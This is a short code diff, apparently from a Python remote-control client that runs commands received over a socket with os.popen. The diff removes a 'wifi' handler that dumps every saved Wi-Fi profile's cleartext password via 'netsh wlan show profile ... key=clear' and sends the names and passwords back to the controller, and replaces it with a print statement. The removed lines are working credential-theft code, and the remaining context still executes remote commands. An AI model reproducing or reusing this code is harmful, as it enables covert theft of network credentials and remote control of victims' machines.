@@ -50,22 +50,6 @@ def recive():
 		elif cmdmode:
 			os.popen(command)
 		else:
-			exe = command.split(' ')[0]
-			try:
-				param = command.split(' ')[1]
-			except:
-				param = ''
-			if exe == 'wifi':
-				data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
-				wifis = [line.split(':')[1][1:-1] for line in data if "All User Profile" in line]
-
-				for wifi in wifis:
-					results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear']).decode('utf-8').split('\n')
-					results = [line.split(':')[1][1:-1] for line in results if "Key Content" in line]
-					try:
-					    client.send(f'Name: {wifi}, Password: {results[0]}'.encode('ascii'))
-					except IndexError:
-						client.send(f'Name: {wifi}, Password: Cannot be read!'.encode('ascii'))
-
+			print(command)
 
 recive()
